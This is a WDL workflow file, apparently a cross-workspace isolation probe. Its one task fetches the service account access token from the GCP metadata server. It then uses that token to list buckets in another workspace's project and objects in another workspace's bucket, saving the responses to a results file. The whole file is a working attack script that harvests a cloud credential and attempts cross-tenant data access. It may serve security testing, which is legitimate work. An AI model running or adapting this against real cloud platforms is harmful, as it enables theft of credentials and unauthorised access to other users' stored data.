version 1.0

workflow cross_workspace_test {
    call probe
}

task probe {
    command <<<
        set -e
        apt-get update -qq && apt-get install -y -qq curl python3 > /dev/null 2>&1

        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          | python3 -c "import json,sys; print(json.loads(sys.stdin.read())['access_token'])")

        echo "=== Token info ===" > results.txt
        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> results.txt 2>&1

        echo "" >> results.txt
        echo "=== List buckets from other workspace project ===" >> results.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> results.txt 2>&1

        echo "" >> results.txt
        echo "=== List objects in other workspace bucket ===" >> results.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> results.txt 2>&1
    >>>

    runtime {
        docker: "ubuntu:22.04"
        memory: "2 GB"
        cpu: 1
        disks: "local-disk 10 HDD"
    }

    output {
        File result = "results.txt"
    }
}
